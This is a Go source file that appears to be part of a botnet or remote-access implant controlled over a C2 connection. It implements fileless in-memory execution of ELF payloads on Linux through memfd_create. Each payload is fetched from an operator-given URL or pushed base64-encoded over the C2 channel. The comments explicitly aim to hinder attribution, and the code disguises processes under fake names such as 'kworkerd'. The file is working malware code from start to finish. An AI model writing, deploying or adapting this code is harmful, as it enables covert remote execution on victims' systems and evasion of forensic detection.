//go:build linux

package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"
)

// Linux memfd_create syscall number for x86-64.
// This is architecture-specific; adjust for ARM64 (SYS_MEMFD_CREATE = 385)
// or other arches if cross-compiling.
const sysMEMFD_CREATE = 319

// mfdCLOEXEC is the MFD_CLOEXEC flag for memfd_create.
// Ensures the fd is automatically closed on execve so child processes
// launched from the bot do not inherit the anonymous mapping.
const mfdCLOEXEC = 1

// elfMagic holds the four-byte ELF magic number used to validate payloads
// before handing them to the kernel for execution.
var elfMagic = [4]byte{0x7f, 'E', 'L', 'F'}

// shadowbrokerMemExec creates an anonymous in-memory file via memfd_create,
// writes the supplied ELF payload into it, then executes it in-place by
// constructing the /proc/self/fd/<n> path that the kernel exposes for every
// open file descriptor.
//
// Because the file never touches the filesystem the technique is often called
// "fileless" or "reflective" execution — no on-disk artefact is created and
// the executable appears in /proc/<pid>/exe as a memfd name (e.g.
// /memfd: (deleted)) rather than a real path.
//
// Parameters:
//   - data: raw ELF binary bytes (caller must pre-validate ELF magic)
//   - args: argv slice; args[0] should be the fake process name visible in ps
//
// Returns: error if memfd_create, write, or exec fails.
// On success this function does NOT return — syscall.Exec replaces the process
// image.  If ForkExec is used instead (non-replacing mode) it returns nil
// after the child is launched.
func shadowbrokerMemExec(data []byte, args []string) error {
	deoxys("shadowbrokerMemExec: creating anonymous memfd (%d bytes)", len(data))

	// ── Step 1: memfd_create("", MFD_CLOEXEC) ───────────────────────────────
	// The empty name string results in the fd appearing as "memfd: (deleted)"
	// in /proc, making attribution harder.
	namePtr, err := syscall.BytePtrFromString("")
	if err != nil {
		return fmt.Errorf("BytePtrFromString: %w", err)
	}
	fd, _, errno := syscall.Syscall(
		sysMEMFD_CREATE,
		uintptr(unsafe.Pointer(namePtr)),
		mfdCLOEXEC,
		0,
	)
	if errno != 0 {
		return fmt.Errorf("memfd_create: %w", errno)
	}
	deoxys("shadowbrokerMemExec: memfd fd=%d", fd)

	// ── Step 2: write payload into the memfd ─────────────────────────────────
	memFile := os.NewFile(fd, "memfd")
	if _, err := memFile.Write(data); err != nil {
		memFile.Close()
		return fmt.Errorf("memfd write: %w", err)
	}
	// Do NOT close memFile before exec — the fd must stay open so the kernel
	// can read the ELF image.  The MFD_CLOEXEC flag ensures it closes after
	// the execve replaces our image.

	// ── Step 3: build /proc/self/fd/<n> path ─────────────────────────────────
	fdPath := "/proc/self/fd/" + strconv.Itoa(int(fd))
	deoxys("shadowbrokerMemExec: execPath=%s args=%v", fdPath, args)

	// ── Step 4: exec ─────────────────────────────────────────────────────────
	// syscall.Exec replaces the current process image (no fork).
	// Use ForkExec if you want the bot to keep running alongside the payload.
	if err := syscall.Exec(fdPath, args, os.Environ()); err != nil {
		memFile.Close()
		return fmt.Errorf("exec: %w", err)
	}
	// Unreachable if syscall.Exec succeeds.
	return nil
}

// shadowbrokerMemExecURL downloads an ELF binary from the given URL using the
// existing rawHTTPGet helper, validates the ELF magic header, and then calls
// shadowbrokerMemExec to execute it entirely in memory without touching disk.
//
// Protocol responses sent to conn:
//   - protoInfoFmt: download progress and exec confirmation
//   - protoErrFmt:  download failure, ELF validation failure, or exec error
//
// Parameters:
//   - conn: active C2 net.Conn used to report status back to the operator
//   - url:  HTTP/HTTPS URL of the ELF binary to fetch and execute
//   - args: argv for the in-memory process; args[0] is the fake process name
func shadowbrokerMemExecURL(conn net.Conn, url string, args []string) {
	deoxys("shadowbrokerMemExecURL: fetching %s", url)
	conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "memexec: fetching "+url)))

	_, body, err := rawHTTPGet(url, nil, 30*time.Second)
	if err != nil {
		deoxys("shadowbrokerMemExecURL: download error: %v", err)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, fmt.Sprintf("memexec download: %v", err))))
		return
	}
	deoxys("shadowbrokerMemExecURL: downloaded %d bytes", len(body))

	// Validate ELF magic — reject garbage before handing to kernel.
	if len(body) < 4 || body[0] != elfMagic[0] || body[1] != elfMagic[1] ||
		body[2] != elfMagic[2] || body[3] != elfMagic[3] {
		deoxys("shadowbrokerMemExecURL: invalid ELF magic bytes")
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, "memexec: not a valid ELF binary")))
		return
	}

	conn.Write([]byte(fmt.Sprintf(protoInfoFmt,
		fmt.Sprintf("memexec: %d bytes, ELF valid, executing in-memory…", len(body)))))

	if err := shadowbrokerMemExec(body, args); err != nil {
		deoxys("shadowbrokerMemExecURL: exec error: %v", err)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, fmt.Sprintf("memexec exec: %v", err))))
	}
	// If exec succeeds this goroutine's process image has been replaced and we
	// never reach the lines below.
}

// shadowbrokerMemExecB64 decodes a base64-encoded ELF binary supplied directly
// by the operator over the C2 channel, validates the ELF header, and executes
// it in memory via shadowbrokerMemExec.
//
// This avoids any network fetch — useful when the operator wants to push a
// pre-compiled payload inline without hosting it on an external server.
//
// Protocol responses sent to conn:
//   - protoInfoFmt: exec start confirmation
//   - protoErrFmt:  base64 decode failure, ELF validation failure, exec error
//
// Parameters:
//   - conn:      active C2 net.Conn
//   - b64data:   standard base64-encoded ELF binary (may contain line breaks)
//   - fakeArgv0: fake process name shown in ps/top for the spawned payload
func shadowbrokerMemExecB64(conn net.Conn, b64data string, fakeArgv0 string) {
	deoxys("shadowbrokerMemExecB64: decoding payload (b64 len=%d)", len(b64data))

	data, err := base64.StdEncoding.DecodeString(b64data)
	if err != nil {
		deoxys("shadowbrokerMemExecB64: base64 decode error: %v", err)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, fmt.Sprintf("memexec b64 decode: %v", err))))
		return
	}
	deoxys("shadowbrokerMemExecB64: decoded %d raw bytes", len(data))

	// Validate ELF magic header before any kernel interaction.
	if len(data) < 4 || data[0] != elfMagic[0] || data[1] != elfMagic[1] ||
		data[2] != elfMagic[2] || data[3] != elfMagic[3] {
		deoxys("shadowbrokerMemExecB64: ELF magic check failed")
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, "memexec: payload is not a valid ELF binary")))
		return
	}

	argv0 := fakeArgv0
	if argv0 == "" {
		argv0 = "kworkerd" // innocuous fallback process name
	}

	conn.Write([]byte(fmt.Sprintf(protoInfoFmt,
		fmt.Sprintf("memexec: %d bytes, ELF valid, executing as '%s'…", len(data), argv0))))

	if err := shadowbrokerMemExec(data, []string{argv0}); err != nil {
		deoxys("shadowbrokerMemExecB64: exec error: %v", err)
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, fmt.Sprintf("memexec exec: %v", err))))
	}
}

